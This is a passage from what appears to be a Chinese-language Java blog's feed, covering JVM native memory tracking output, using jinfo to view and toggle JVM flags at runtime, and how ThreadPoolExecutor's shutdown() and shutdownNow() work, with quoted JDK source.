0x00007ef481895000] reserved and committed 1028KB for Thread Stack from</span><br><span class="line">    [0x00007f0486546f74] JavaThread::run()+0x24</span><br><span class="line">    [0x00007f04863fab88] java_start(Thread*)+0x108</span><br><span class="line"> </span><br><span class="line">[0x00007ef48224d000 - 0x00007ef48244d000] reserved 2048KB for Class from</span><br><span class="line">    [0x00007f0486593c66] ReservedSpace::initialize(unsigned long, unsigned long, bool, char*, unsigned long, bool)+0x256</span><br><span class="line">    [0x00007f0486593d0b] ReservedSpace::ReservedSpace(unsigned long, unsigned long, bool, char*, unsigned long)+0x1b</span><br><span class="line">    [0x00007f0486379cda] VirtualSpaceNode::VirtualSpaceNode(unsigned long)+0x17a</span><br><span class="line">    [0x00007f048637a59a] VirtualSpaceList::create_new_virtual_space(unsigned long)+0x5a</span><br><span class="line"></span><br><span class="line">[0x00007ef48228d000 - 0x00007ef4823cd000] committed 1280KB from</span><br><span class="line">            [0x00007f0486593549] VirtualSpace::expand_by(unsigned long, bool)+0x199</span><br><span class="line">            [0x00007f0486377936] VirtualSpaceList::expand_node_by(VirtualSpaceNode*, unsigned long, unsigned long)+0x76</span><br><span class="line">            [0x00007f048637a750] VirtualSpaceList::expand_by(unsigned long, unsigned long)+0xf0</span><br><span class="line">            [0x00007f048637a8e3] VirtualSpaceList::get_new_chunk(unsigned long, unsigned long, unsigned long)+0xb3</span><br><span class="line"></span><br><span class="line">[0x00007ef48224d000 - 0x00007ef48228d000] committed 256KB from</span><br><span class="line">            [0x00007f0486593549] VirtualSpace::expand_by(unsigned long, bool)+0x199</span><br><span class="line">            [0x00007f0486377936] VirtualSpaceList::expand_node_by(VirtualSpaceNode*, unsigned long, unsigned long)+0x76</span><br><span class="line">            [0x00007f048637a8e3] VirtualSpaceList::get_new_chunk(unsigned long, unsigned long, unsigned long)+0xb3</span><br><span class="line">            [0x00007f048637c432] SpaceManager::grow_and_allocate(unsigned long)+0x2d2</span><br></pre></td></tr></table></figure><img src="/2017/12/02/google-perf-tools/memory-mapping.jpg"><p>如果通过上述的映射关系能直接找到系统的<code>StringTable</code>等对应的分区，dump内存下来应该能很快的发现问题，不知道行不行得通。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><p><a href="http://lovestblog.cn/blog/2015/08/21/rssxmx/" rel="external nofollow noopener noreferrer" target="_blank">进程物理内存远大于Xmx的问题分析 - 你假笨</a></p></li><li><p><a href="http://lovestblog.cn/blog/2015/05/12/direct-buffer/" rel="external nofollow noopener noreferrer" target="_blank">JVM源码分析之堆外内存完全解读 - 你假笨</a></p></li><li><p><a href="http://calvin1978.blogcn.com/articles/directbytebuffer.html" rel="external nofollow noopener noreferrer" target="_blank">Netty之Java堆外内存扫盲贴 | 江南白衣</a></p></li><li><p><a href="http://blog.csdn.net/jicahoo/article/details/50933469" rel="external nofollow noopener noreferrer" target="_blank">Java内存之本地内存分析神器： NMT 和 pmap - CSDN博客</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=MzA4MTc4NTUxNQ==&amp;mid=2650518452&amp;idx=1&amp;sn=c196bba265f888ed086b7059ca5d3fd2&amp;chksm=8780b470b0f73d66c79b7df96435d48caa8c49a9a6b696e543c0df24e3356202ccde69f2f671&amp;mpshare=1&amp;scene=1&amp;srcid=0831YG589PwShEgNLJ8CKQOp#rd" rel="external nofollow noopener noreferrer" target="_blank">Java堆外内存排查小结</a></p></li><li><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/vm/nmt-8.html" rel="external nofollow noopener noreferrer" target="_blank">Native Memory Tracking</a></p></li><li><p><a href="https://gperftools.github.io/gperftools/cpuprofile.html" rel="external nofollow noopener noreferrer" target="_blank">Gperftools CPU Profiler</a></p></li><li><p><a href="http://whosemario.github.io/2016/09/27/google-preftool-1/index.html" rel="external nofollow noopener noreferrer" target="_blank">Google Perftools Mac OS 安装与使用 | Whosemario的家</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;现象&quot;&gt;&lt;a href=&quot;#现象&quot; class=&quot;headerlink&quot; title=&quot;现象&quot;&gt;&lt;/a&gt;现象&lt;/h2&gt;&lt;p&gt;线上机器内存不足，经常被系统&lt;code&gt;oom killer&lt;/code&gt;干掉。&lt;/p&gt;
&lt;p&gt;如果&lt;code&gt;tomcat&lt;/code&gt;运
      
    
    </summary>
    
      <category term="perf" scheme="http://qsli.github.io/categories/perf/"/>
    
    
      <category term="google-perf" scheme="http://qsli.github.io/tags/google-perf/"/>
    
  </entry>
  
  <entry>
    <title>jinfo使用</title>
    <link href="http://qsli.github.io/2017/11/26/jinfo/"/>
    <id>http://qsli.github.io/2017/11/26/jinfo/</id>
    <published>2017-11-26T15:02:14.000Z</published>
    <updated>2018-08-11T12:42:42.092Z</updated>
    
    <content type="html"><![CDATA[<h2 id="查看最终生效的flag"><a href="#查看最终生效的flag" class="headerlink" title="查看最终生效的flag"></a>查看最终生效的flag</h2><p><code>sudo -u tomcat jinfo pid</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Attaching to process ID 30350, please wait...</span><br><span class="line">Debugger attached successfully.</span><br><span class="line">Server compiler detected.</span><br><span class="line">JVM version is 24.45-b08</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">sun.cpu.endian = little</span><br><span class="line">package.access = sun.,org.apache.catalina.,org.apache.coyote.,org.apache.tomcat.,org.apache.jasper.,sun.beans.</span><br><span class="line">sun.cpu.isalist = </span><br><span class="line"></span><br><span class="line">VM Flags:</span><br><span class="line"></span><br><span class="line">-Djava.util.logging.config.file=/tomcat/www/application/conf/logging.properties -Xms6g -Xmx6g -Xmn4g -XX:PermSize=256m -XX:MaxPermSize=256M ... -Djava.io.tmpdir=/tomcat/www/application/temp</span><br></pre></td></tr></table></figure><h3 id="java-XX-PrintFlagsFinal"><a href="#java-XX-PrintFlagsFinal" class="headerlink" title="java -XX:+PrintFlagsFinal"></a>java -XX:+PrintFlagsFinal</h3><p>使用<code>-version</code>可以查看java支持的开关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -XX:+PrintFlagsFinal -version</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  qsli.github.com (hexo|✚6…) java -XX:+PrintFlagsFinal -version</span><br><span class="line">[Global flags]</span><br><span class="line">    uintx AdaptiveSizeDecrementScaleFactor          = 4                                   &#123;product&#125;</span><br><span class="line">    uintx AdaptiveSizeMajorGCDecayTimeScale         = 10                                  &#123;product&#125;</span><br><span class="line">    uintx AdaptiveSizePausePolicy                   = 0                                   &#123;product&#125;</span><br><span class="line">    uintx AdaptiveSizePolicyCollectionCostMargin    = 50                                  &#123;product&#125;</span><br><span class="line">    uintx AdaptiveSizePolicyInitializingSteps       = 20                                  &#123;product&#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    uintx YoungGenerationSizeSupplementDecay        = 8                                   &#123;product&#125;</span><br><span class="line">    uintx YoungPLABSize                             = 4096                                &#123;product&#125;</span><br><span class="line">     bool ZeroTLAB                                  = false                               &#123;product&#125;</span><br><span class="line">     intx hashCode                                  = 5                                   &#123;product&#125;</span><br><span class="line">java version &quot;1.8.0_112&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_112-b15)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.112-b15, mixed mode)</span><br></pre></td></tr></table></figure><p>但是<code>白衣大侠</code>说，<code>-version</code>的结果可能不准确，最好实际跑一下。</p><blockquote><p>经常以类似下面的语句去查看参数，偷懒不起应用，用-version代替。有些参数设置后会影响其他参数，所以查看时也把它带上。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -server -Xmx1024m -Xms1024m -XX:+UseConcMarkSweepGC -XX:+PrintFlagsFinal -version| grep ParallelGCThreads</span><br></pre></td></tr></table></figure><h2 id="动态打开jvm的开关"><a href="#动态打开jvm的开关" class="headerlink" title="动态打开jvm的开关"></a>动态打开jvm的开关</h2><p>jinfo可以动态的改变jvm的flag， 而不必重启服务器。虽然只对一些特定的flag有效，但是有的时候也很有用。</p><p>支持动态开启和关闭的的flag，可以通过下面的命令查看。</p><p><code>java -XX:+PrintFlagsFinal -version | grep managed</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">qsli.github.com (hexo|✚6…) java -XX:+PrintFlagsInitial | grep manageable</span><br><span class="line">     intx CMSAbortablePrecleanWaitMillis            = 100                                 &#123;manageable&#125;</span><br><span class="line">     intx CMSTriggerInterval                        = -1                                  &#123;manageable&#125;</span><br><span class="line">     intx CMSWaitDuration                           = 2000                                &#123;manageable&#125;</span><br><span class="line">     bool HeapDumpAfterFullGC                       = false                               &#123;manageable&#125;</span><br><span class="line">     bool HeapDumpBeforeFullGC                      = false                               &#123;manageable&#125;</span><br><span class="line">     bool HeapDumpOnOutOfMemoryError                = false                               &#123;manageable&#125;</span><br><span class="line">    ccstr HeapDumpPath                              =                                     &#123;manageable&#125;</span><br><span class="line">    uintx MaxHeapFreeRatio                          = 70                                  &#123;manageable&#125;</span><br><span class="line">    uintx MinHeapFreeRatio                          = 40                                  &#123;manageable&#125;</span><br><span class="line">     bool PrintClassHistogram                       = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintClassHistogramAfterFullGC            = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintClassHistogramBeforeFullGC           = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintConcurrentLocks                      = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGC                                   = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCDateStamps                         = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCDetails                            = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCID                                 = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCTimeStamps                         = false                               &#123;manageable&#125;</span><br></pre></td></tr></table></figure><p>用<code>JConsole</code>打开，可以看到相应的<code>MXBean</code>节点:</p><img src="/2017/11/26/jinfo/jinfo.png"><p>使用代码也可以获取对应的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> afei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.0.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2017年07月25日</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DiagnosticOptionsTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HotSpotDiagnostic mxBean = <span class="keyword">new</span> HotSpotDiagnostic();</span><br><span class="line">        List&lt;VMOption&gt; diagnosticVMOptions = mxBean.getDiagnosticOptions();</span><br><span class="line">        <span class="keyword">for</span> (VMOption vmOption:diagnosticVMOptions)&#123;</span><br><span class="line">            System.out.println(vmOption.getName() + <span class="string">" = "</span> + vmOption.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>代码拷贝自参考1</p></blockquote><p>然后就可以使用下面的命令，打开或者关闭相应的开关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-flag [+|-]name</span><br><span class="line">            enables or disables the given boolean command line flag.</span><br></pre></td></tr></table></figure><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u tomcat jinfo -flag  -PrintGC `pgrep -f tomcat`</span><br><span class="line">sudo -u tomcat jinfo -flag  +PrintGC `pgrep -f tomcat`</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><p><a href="http://www.jianshu.com/p/c321d0808a1b" rel="external nofollow noopener noreferrer" target="_blank">jinfo命令详解 - 简书</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=MzU3NDAxMzU1Nw==&amp;mid=2247484957&amp;idx=3&amp;sn=ee1e459b6e579555b7006cb69a6bb7f1&amp;chksm=fd39af07ca4e2611707621a71dedfa7329668d741fa2b4bdc9835ef14583cf79adb378d8d6c6&amp;mpshare=1&amp;scene=1&amp;srcid=1123RfpGGNhu1XF30IA20OFH#rd" rel="external nofollow noopener noreferrer" target="_blank">Java调优经验谈</a></p></li><li><p><a href="http://rednaxelafx.iteye.com/blog/1049240" rel="external nofollow noopener noreferrer" target="_blank">通过jinfo工具在full GC前后做heap dump - Script Ahead, Code Behind - ITeye博客</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=MzIzODYyNjkzNw==&amp;mid=2247483687&amp;idx=1&amp;sn=41f24dac62c0ca65e4dfe32eae62f3f2&amp;chksm=e9373031de40b927497e5b9aa5dacae6e0a5bac8c760e05ae1d983baf700f45fe8f6c1cfca41&amp;mpshare=1&amp;scene=1&amp;srcid=0904E8auyJdEzKjyytGtjpVO#rd" rel="external nofollow noopener noreferrer" target="_blank">关键业务系统的JVM参数推荐(2016热冬版）</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;查看最终生效的flag&quot;&gt;&lt;a href=&quot;#查看最终生效的flag&quot; class=&quot;headerlink&quot; title=&quot;查看最终生效的flag&quot;&gt;&lt;/a&gt;查看最终生效的flag&lt;/h2&gt;&lt;p&gt;&lt;code&gt;sudo -u tomcat jinfo pid&lt;/co
      
    
    </summary>
    
      <category term="java" scheme="http://qsli.github.io/categories/java/"/>
    
    
      <category term="jinfo" scheme="http://qsli.github.io/tags/jinfo/"/>
    
  </entry>
  
  <entry>
    <title>executor总结</title>
    <link href="http://qsli.github.io/2017/11/19/executor/"/>
    <id>http://qsli.github.io/2017/11/19/executor/</id>
    <published>2017-11-18T20:01:22.000Z</published>
    <updated>2018-08-11T12:42:41.352Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shutdown-和shutdownNow"><a href="#shutdown-和shutdownNow" class="headerlink" title="shutdown()和shutdownNow()"></a>shutdown()和shutdownNow()</h2><h3 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown()"></a>shutdown()</h3><p><code>shutdown()</code>会尝试中断空闲的线程，并把<code>ThreadPool</code>的状态置成<code>SHUTDOWN</code>,<br>这个状态下，不能通过<code>submit()</code>或者<code>execute()</code>提交任务，但是正在执行的和任务队列中的任务还可以继续执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shutdown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">    mainLock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        checkShutdownAccess();</span><br><span class="line">        advanceRunState(SHUTDOWN);</span><br><span class="line">        interruptIdleWorkers();</span><br><span class="line">        onShutdown(); <span class="comment">// hook for ScheduledThreadPoolExecutor</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        mainLock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">    tryTerminate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>任务队列中的任务拉取, 通过<code>getTask()</code>方法进行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">runWorker</span><span class="params">(Worker w)</span> </span>&#123;</span><br><span class="line">      Thread wt = Thread.currentThread();</span><br><span class="line">      Runnable task = w.firstTask;</span><br><span class="line">      w.firstTask = <span class="keyword">null</span>;</span><br><span class="line">      w.unlock(); <span class="comment">// allow interrupts</span></span><br><span class="line">      <span class="keyword">boolean</span> completedAbruptly = <span class="keyword">true</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">while</span> (task != <span class="keyword">null</span> || (task = getTask()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">              w.lock();</span><br><span class="line">              <span class="comment">// If pool is stopping, ensure thread is interrupted;</span></span><br><span class="line">              <span class="comment">// if not, ensure thread is not interrupted.  This</span></span><br><span class="line">              <span class="comment">// requires a recheck in second case to deal with</span></span><br><span class="line">              <span class="comment">// shutdownNow race while clearing interrupt</span></span><br><span class="line">              <span class="keyword">if</span> ((runStateAtLeast(ctl.get(), STOP) ||</span><br><span class="line">                   (Thread.interrupted() &amp;&amp;</span><br><span class="line">                    runStateAtLeast(ctl.get(), STOP))) &amp;&amp;</span><br><span class="line">                  !wt.isInterrupted())</span><br><span class="line">                  wt.interrupt();</span><br><span class="line">              <span class="keyword">try</span> &#123;</span><br><span class="line">                  beforeExecute(wt, task);</span><br><span class="line">                  Throwable thrown = <span class="keyword">null</span>;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      task.run();</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (RuntimeException x) &#123;</span><br><span class="line">                      thrown = x; <span class="keyword">throw</span> x;</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (Error x) &#123;</span><br><span class="line">                      thrown = x; <span class="keyword">throw</span> x;</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (Throwable x) &#123;</span><br><span class="line">                      thrown = x; <span class="keyword">throw</span> <span class="keyword">new</span> Error(x);</span><br><span class="line">                  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                      afterExecute(task, thrown);</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                  task = <span class="keyword">null</span>;</span><br><span class="line">                  w.completedTasks++;</span><br><span class="line">                  w.unlock();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          completedAbruptly = <span class="keyword">false</span>;</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          processWorkerExit(w, completedAbruptly);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="shutdownNow"><a href="#shutdownNow" class="headerlink" title="shutdownNow()"></a>shutdownNow()</h3><p><code>shutdownNow()</code>会中断所有的<code>worker</code>线程， 然后将队列里没有执行的任务全部停止并返回。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Runnable&gt; <span class="title">shutdownNow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       List&lt;Runnable&gt; tasks;</span><br><span class="line">       <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">       mainLock.lock();</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           checkShutdownAccess();</span><br><span class="line">           advanceRunState(STOP);</span><br><span class="line">           interruptWorkers();</span><br><span class="line">           tasks = drainQueue();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           mainLock.unlock();</span><br><span class="line">       &#125;</span><br><span class="line">       tryTerminate();</span><br><span class="line">       <span class="keyword">return</span> tasks;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>中断线程池中的线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Interrupts all threads, even if active. Ignores SecurityExceptions</span></span><br><span class="line"><span class="comment">    * (in which case some threads may remain uninterrupted).</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">interruptWorkers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">       mainLock.lock();</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">for</span> (Worker w : workers)</span><br><span class="line">               w.interruptIfStarted();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           mainLock.unlock();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">interruptIfStarted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">           Thread t;</span><br><span class="line">           <span class="keyword">if</span> (getState() &gt;= <span class="number">0</span> &amp;&amp; (t = thread) != <span class="keyword">null</span> &amp;&amp; !t.isInterrupted()) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   t.interrupt();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (SecurityException ignore) &#123;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>停止任务队列中没有执行的任务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Drains the task queue into a new list, normally using</span></span><br><span class="line"><span class="comment">    * drainTo. But if the queue is a DelayQueue or any other kind of</span></span><br><span class="line"><span class="comment">    * queue for which poll or drainTo may fail to remove some</span></span><br><span class="line"><span class="comment">    * elements, it deletes them one by one.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> List&lt;Runnable&gt; <span class="title">drainQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       BlockingQueue&lt;Runnable&gt; q = workQueue;</span><br><span class="line">       ArrayList&lt;Runnable&gt; taskList = <span class="keyword">new</span> ArrayList&lt;Runnable&gt;();</span><br><span class="line">       q.drainTo(taskList);</span><br><span class="line">       <span class="keyword">if</span> (!q.isEmpty()) &#123;</span><br><span class="line">           <span class="keyword">for</span> (Runnable r : q.toArray(<span class="keyword">new</span> Runnable[<span class="number">0</span>])) &#123;</span><br><span class="line">               <span class="keyword">if</span> (q.remove(r))</span><br><span class="line">                   taskList.add(r);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> taskList;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>java中线程的停止是协作式的，线程要主动检查<code>interrupted</code>状态，并做出响应才能正确退出。</p><h3 id="JVM退出"><a href="#JVM退出" class="headerlink" title="JVM退出"></a>JVM退出</h3><ul><li>非守护线程</li></ul><p>如果线程池里的线程是非守护线程， JVM会等待线程的退出，然后才会真正的推出。</p><ul><li>守护线程（不推荐）</li></ul><p>JVM退出的时候不会等待守护线程，因此如果要等待所有的任务执行完后再退出，需要自己代码处理, 可以使用<code>awaitTermination</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">awaitTermination</span><span class="params">(<span class="keyword">long</span> timeout, TimeUnit unit)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> nanos = unit.toNanos(timeout);</span><br><span class="line">        <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">        mainLock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="keyword">if</span> (runStateAtLeast(ctl.get(), TERMINATED))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">if</span> (nanos &lt;= <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                nanos = termination.awaitNanos(nanos);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            mainLock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中<code>termination</code>是结束的条件队列</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Lock held on access to workers set and related bookkeeping.</span></span><br><span class="line"><span class="comment"> * While we could use a concurrent set of some sort, it turns out</span></span><br><span class="line"><span class="comment"> * to be generally preferable to use a lock. Among the reasons is</span></span><br><span class="line"><span class="comment"> * that this serializes 